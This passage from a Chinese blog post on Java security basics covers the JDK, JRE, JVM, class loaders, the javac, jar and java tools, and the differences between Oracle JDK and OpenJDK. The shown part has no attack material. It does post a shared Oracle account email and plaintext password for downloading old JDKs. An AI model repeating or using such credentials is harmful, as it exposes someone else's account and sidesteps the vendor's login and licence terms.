<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2024/11/11/java 安全基础/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Java 安全基础 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">57</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Java 安全基础</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-11-11 23:50:14</span>
        <span class="mobile">2024-11-11 23:50:14</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-10-28 12:50:31</span>
            <span class="mobile">2025-10-28 12:50:31</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/java-web/">java web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/java-web/">java web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>55.9k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>242 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.javasec.org/" >https://www.javasec.org/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://p4d0rn.gitbook.io/java" >https://p4d0rn.gitbook.io/java<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<p>Java 是一种 <strong>面向对象的编程语言</strong>，由 <strong>Sun Microsystems</strong>（现在是 Oracle）于 1995 年发布。它是 <strong>跨平台</strong> 的，可以运行在不同操作系统上，而不需要修改源代码。Java 程序可以通过 <strong>JVM（Java Virtual Machine）</strong> 在不同平台上运行。</p>
<ul>
<li><strong>跨平台</strong> ：Java 程序经过编译后，会生成与平台无关的字节码（.class 文件），通过 JVM 解释或编译执行。</li>
<li><strong>面向对象</strong> ：Java 是一门面向对象的语言，强调封装、继承、多态、抽象等特性。Java 程序是通过 <strong>类（Class）</strong> 和 <strong>对象（Object）</strong> 组织的。</li>
</ul>
<p>Java 中常见的成员标识写法约定如下：</p>
<ul>
<li><strong><code>.</code></strong> ：表示 <strong>包名分隔</strong> 或 <strong>源码&#x2F;文档里的内部类分隔</strong>。例：<code>java.util.Map</code>，<code>Map.Entry</code></li>
<li><strong><code>$</code></strong> ：表示 <strong>字节码&#x2F;反射里的内部类分隔</strong>，这是编译产物，源码里一般不用写。例：<code>Map$Entry</code></li>
<li><strong><code>#</code></strong> ：Javadoc 风格的 <strong>成员访问符</strong>，用来指代类的 <strong>方法、构造方法、字段</strong>。例：<code>List#add</code>，<code>Math#abs(double)</code>，<code>System#out</code>，<code>ArrayList#ArrayList(int)</code></li>
</ul>
<p>本质上就这三种符号组合：</p>
<ul>
<li><code>.</code> → 包&#x2F;内部类（源码视角）</li>
<li><code>$</code> → 内部类（JVM视角）</li>
<li><code>#</code> → 成员（方法&#x2F;构造&#x2F;字段，Javadoc 视角）</li>
</ul>
<h1 id="JDK（Java-Development-Kit）"><a href="#JDK（Java-Development-Kit）" class="headerlink" title="JDK（Java Development Kit）"></a>JDK（Java Development Kit）</h1><p><strong>JDK（Java Development Kit）</strong> 是 Java 开发工具包（Java Development Kit），是开发 Java 程序所需的工具集合。JDK 包含了 JRE 和一些用于开发 Java 应用的工具。</p>
<h2 id="JDK-的组成"><a href="#JDK-的组成" class="headerlink" title="JDK 的组成"></a>JDK 的组成</h2><h3 id="JRE（Java-Runtime-Environment）"><a href="#JRE（Java-Runtime-Environment）" class="headerlink" title="JRE（Java Runtime Environment）"></a>JRE（Java Runtime Environment）</h3><p><strong>JRE（Java Runtime Environment）</strong> 是 <strong>Java 运行时环境</strong>，是为 Java 程序的执行提供支持的软件环境。JRE 主要包含了 Java 虚拟机（JVM）和 Java 核心类库，确保 Java 应用程序可以在不同操作系统上无缝运行。</p>
<p>JRE 是 <strong>运行 Java 程序</strong> 的必需组件，它为开发者提供了一个可以运行 Java 字节码的环境。但它本身不包含开发工具，比如 Java 编译器（<code>javac</code>），因此 JRE 仅适用于运行 Java 程序，而不适用于开发 Java 程序。</p>
<h4 id="Java-虚拟机（JVM）"><a href="#Java-虚拟机（JVM）" class="headerlink" title="Java 虚拟机（JVM）"></a>Java 虚拟机（JVM）</h4><p><strong>JVM（Java Virtual Machine）</strong> 是 JRE 的核心部分，它负责加载和执行 Java 程序中的字节码。JVM 是 Java 实现 <strong>跨平台</strong> 的关键，能够在不同的操作系统上执行相同的 Java 程序。JVM 会将 Java 字节码转换成特定平台的机器代码并执行。</p>
<p>JVM 的主要任务包括：</p>
<ul>
<li><strong>加载字节码</strong>：JVM 加载 Java 字节码文件（<code>.class</code> 文件）到内存中。</li>
<li><strong>字节码验证</strong>：JVM 验证字节码，确保它符合 JVM 的执行规范。</li>
<li><strong>执行字节码</strong>：通过解释执行或即时编译（JIT）将字节码转换为机器码并执行。</li>
<li><strong>内存管理</strong>：JVM 负责分配和回收内存，特别是堆内存和栈内存。</li>
<li><strong>垃圾回收</strong>：JVM 通过垃圾回收机制自动回收不再使用的对象，以便释放内存。</li>
</ul>
<h4 id="Java-核心类库（Java-Core-Libraries）"><a href="#Java-核心类库（Java-Core-Libraries）" class="headerlink" title="Java 核心类库（Java Core Libraries）"></a>Java 核心类库（Java Core Libraries）</h4><p>Java 核心类库是 JRE 的另一个重要组成部分，它包含了 Java 程序运行所需的标准类和 API。核心类库包括以下几个常用的包：</p>
<ul>
<li><strong><code>java.lang</code></strong> ：包括基础类和常用类，如 <code>String</code>、<code>Object</code>、<code>Math</code>、<code>System</code> 等。</li>
<li><strong><code>java.util</code></strong> ：包含集合框架、日期、时间、随机数生成等常用工具类，如 <code>ArrayList</code>、<code>HashMap</code>、<code>Date</code>、<code>Calendar</code> 等。</li>
<li><strong><code>java.io</code></strong> ：提供输入输出流类，用于文件操作和数据流处理。</li>
<li><strong><code>java.net</code></strong> ：提供网络编程功能，支持 socket 编程、URL 处理等。</li>
<li><strong><code>java.sql</code></strong> ：用于数据库访问的标准 API，支持 JDBC。</li>
</ul>
<p>这些类库提供了 Java 应用程序开发和运行所需的基础功能。</p>
<h4 id="本地接口（JNI）"><a href="#本地接口（JNI）" class="headerlink" title="本地接口（JNI）"></a>本地接口（JNI）</h4><p>Java 程序与操作系统和硬件交互时，可能需要调用底层操作系统的功能。JRE 通过 <strong>Java 本地接口（JNI，Java Native Interface）</strong> 提供与本地代码（如 C 或 C++）的互操作能力。JNI 使得 Java 可以调用平台特定的库，执行操作系统的低级功能。</p>
<h4 id="Java-类加载器（ClassLoader）"><a href="#Java-类加载器（ClassLoader）" class="headerlink" title="Java 类加载器（ClassLoader）"></a>Java 类加载器（ClassLoader）</h4><p>JRE 中的 <strong>类加载器（ClassLoader）</strong> 负责将 Java 类（.class 文件）加载到 JVM 中。类加载器的任务包括：</p>
<ul>
<li><strong>加载类文件</strong> ：JVM 通过类加载器将字节码从硬盘、网络或其他地方加载到内存。</li>
<li><strong>检查类的可用性</strong> ：类加载器负责确定类是否已经被加载，避免重复加载。</li>
</ul>
<p>JRE 提供了几种不同类型的类加载器，分别负责加载不同类型的类，例如<strong>启动类加载器（Bootstrap ClassLoader）</strong>、<strong>扩展类加载器（Extension ClassLoader）</strong>和<strong>系统类加载器（System ClassLoader）</strong>。</p>
<h3 id="Java-开发工具（Java-Development-Tools）"><a href="#Java-开发工具（Java-Development-Tools）" class="headerlink" title="Java 开发工具（Java Development Tools）"></a>Java 开发工具（Java Development Tools）</h3><p>Java 开发工具是为 Java 开发者提供的，用于支持 <strong>代码编写、编译、调试、测试、打包和文档生成等任务</strong>。这些工具大多是命令行工具，也可以在集成开发环境（IDE）中找到它们的图形化界面。常见的 Java 开发工具包括 <strong>编译器（javac）</strong>、<strong>调试器（jdb）</strong>、<strong>打包工具（jar）</strong>、<strong>文档生成工具（javadoc）</strong> 等。</p>
<h4 id="Java-编译器（javac）"><a href="#Java-编译器（javac）" class="headerlink" title="Java 编译器（javac）"></a>Java 编译器（javac）</h4><p><code>javac</code> 是 Java 的编译器，负责将 <strong>Java 源代码（<code>.java</code> 文件）</strong> 编译成 <strong>字节码（<code>.class</code> 文件）</strong>。这些字节码是平台无关的，可以在任何安装了 JVM 的平台上运行。</p>
<p>例如我们运行下面这条命令，这会将 <code>HelloWorld.java</code> 编译成 <code>HelloWorld.class</code> 字节码文件。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac HelloWorld.java</span><br></pre></td></tr></table></figure></div>

<p>在 IDEA 中编译器选项在这里修改：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/image-20250218011825051.png"
                      alt="image-20250218011825051"
                ></p>
<h4 id="java-归档工具（jar）"><a href="#java-归档工具（jar）" class="headerlink" title="java 归档工具（jar）"></a>java 归档工具（jar）</h4><p><code>jar</code> 是 Java 的归档工具，用于将多个 <code>.class</code> 文件和其他资源（如配置文件、图片等）打包成一个单一的 <strong>JAR 文件</strong>，便于分发和部署。JAR 文件可以包含多个类文件和资源文件，并且支持压缩。</p>
<p>例如我们可以通过下面这条命令创建一个简单的 JAR 文件，包含多个 <code>.class</code> 文件：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cf myapp.jar *.class</span><br></pre></td></tr></table></figure></div>

<p>这里，<code>c</code> 表示创建，<code>f</code> 表示指定文件名，<code>myapp.jar</code> 是输出的 JAR 文件，<code>*.class</code> 表示要打包的所有类文件。</p>
<h4 id="Java-运行工具（java）"><a href="#Java-运行工具（java）" class="headerlink" title="Java 运行工具（java）"></a>Java 运行工具（java）</h4><p><code>java</code> 是用于运行 Java 程序的工具，它会调用 JRE 中的 <strong>Java 虚拟机（JVM）</strong>来加载执行 <code>.class</code> 文件。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java HelloWorld <span class="comment"># 并加载 Hello.class 文件来执行程序</span></span><br><span class="line">java -jar myapp.jar <span class="comment"># 运行 JAR 文件</span></span><br></pre></td></tr></table></figure></div>

<h2 id="JDK-的版本"><a href="#JDK-的版本" class="headerlink" title="JDK 的版本"></a>JDK 的版本</h2><p>Java 语言最初由 <strong>Sun Microsystems</strong>（后被 Oracle 收购）开发和维护，后来由 Oracle 以及一些开源社区继续维护和更新。由于不同的实现方式、开发目标以及不同的维护模式，产生了多种 <strong>JDK 实现</strong>。</p>
<h3 id="常见-JDK-发行版"><a href="#常见-JDK-发行版" class="headerlink" title="常见 JDK 发行版"></a>常见 JDK 发行版</h3><h4 id="Oracle-JDK"><a href="#Oracle-JDK" class="headerlink" title="Oracle JDK"></a>Oracle JDK</h4><p><strong>Oracle JDK</strong> 是由 Oracle 提供的官方 Java 实现。它包括了所有的功能和企业级支持，包括商业支持和额外的优化。Oracle JDK 是最广泛使用的 JDK 发行版之一，特别是在企业级应用中。</p>
<p>我们可以在 <a class="link"   target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/downloads/archive/#JavaSE" >Oracle JDK官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>下载安装历史版本的 Oracle JDK。</p>
<p>Oracle JDK 是 <strong>闭源</strong> 的，虽然它包含 Java 的完整功能，但对于某些用户（如企业用户）来说，可能需要购买支持和许可证。不过我们通常下载的 JAVA SE 版本，因此只需要登录即可。</p>
<blockquote>
<p><strong>Java SE（Java Standard Edition）</strong> 是 Java 语言的基础平台，提供了开发和运行桌面应用程序、控制台应用程序、命令行工具和普通应用程序所需要的所有基本类库和 API。</p>
<p><strong>Java EE（Java Enterprise Edition）</strong> 是 Java 平台的企业级版本，专门用于开发大型、复杂、分布式的企业级应用程序。它建立在 Java SE 的基础上，并扩展了许多高级功能和 API，适合于开发 Web 应用、分布式系统、大型企业系统等。</p>
<p><strong>Java EE</strong> 本身并不是一个独立的开发工具包，而是规范和技术的集合，它需要依赖 <strong>JDK</strong> 来进行开发和运行。<strong>JDK</strong> 提供了编译和运行 Java 应用所需要的工具，而 <strong>Java EE</strong> 则是一个扩展，提供了面向企业的技术和功能。</p>
<p>虽然 <strong>Java EE</strong>（或 <strong>Jakarta EE</strong>）提供了很多高级功能，如 <strong>EJB</strong>（企业级 Java Beans）、<strong>JPA</strong>（Java 持久化 API）、<strong>JMS</strong>（Java 消息服务）、<strong>JTA</strong>（Java 事务 API）等，但这些技术对于大多数 Web 应用来说并不总是必需的。随着 <strong>Spring</strong> 和 <strong>Spring Boot</strong> 的流行，很多开发者已经不再依赖传统的 <strong>Java EE</strong> 容器来开发 Web 应用，而是转向了更加轻量级、灵活的解决方案。也就是说现在的 Web 开发可以脱离传统的 <strong>Java EE</strong>，而使用 <strong>Java SE + Web 框架 + Web 服务器</strong> 的模式。</p>
<p><strong>因此我们在研究 Java 安全的时候一般不需要 Java EE 。</strong></p>
</blockquote>
<p>关于 Oracle 官网的登录，网上有很多 Oracle 的共享账号，这里提供一个方便下载：</p>
<ul>
<li>账号：<code>908344069@qq.com</code> </li>
<li>密码：<code>Java_2024</code></li>
</ul>
<h4 id="OpenJDK"><a href="#OpenJDK" class="headerlink" title="OpenJDK"></a>OpenJDK</h4><p><strong>OpenJDK</strong> 是 Java 的开源实现，是由多个开源社区（包括 Oracle）共同开发和维护的 JDK 版本。</p>
<blockquote>
<p><strong>“Oracle JDK 是闭源”是个历史印象。</strong>早年（JDK6&#x2F;7&#x2F;8 的很长一段时间）Oracle JDK里确实带了一些<strong>专有&#x2F;未开源的组件</strong>和“商业功能”，而 OpenJDK 完全是 <strong>GPLv2 + Classpath Exception</strong> 的开源代码；所以大家才把 Oracle JDK 叫“闭源”。<br>从 <strong>JDK 11 开始</strong>，Oracle JDK 与 OpenJDK 在<strong>代码上基本等价</strong>（核心代码同源），主要区别变成了<strong>许可证和支持策略</strong>，而不是“有没有源码”。</p>
</blockquote>
<p>OpenJDK 是 <strong>Java SE</strong> 的标准实现，并且是完全开源的，遵循 GNU General Public License（GPL）许可证。它没有 Oracle JDK 中的一些商业功能（如 Java Flight Recorder 等），但对于大多数开发者来说，OpenJDK 足以满足需求。</p>
<p>OpenJDK 是 Java SE 的参考实现，因此任何符合 Java SE 规范的 JDK 实现都可以被称为 “JDK”。多个公司和组织都基于 OpenJDK 提供了不同版本的 JDK，并提供相应的支持。例如：</p>
<ul>
<li><strong>AdoptOpenJDK（现在更名为 Adoptium）</strong> ：由社区维护的 OpenJDK 构建版本，适用于多种操作系统。</li>
<li><strong>Amazon Corretto</strong>  ：亚马逊提供的 OpenJDK 构建，具有长期支持（LTS）版本。</li>
<li><strong>Red Hat OpenJDK</strong>  ：由 Red Hat 提供的 OpenJDK 版本，适合企业级应用。</li>
</ul>
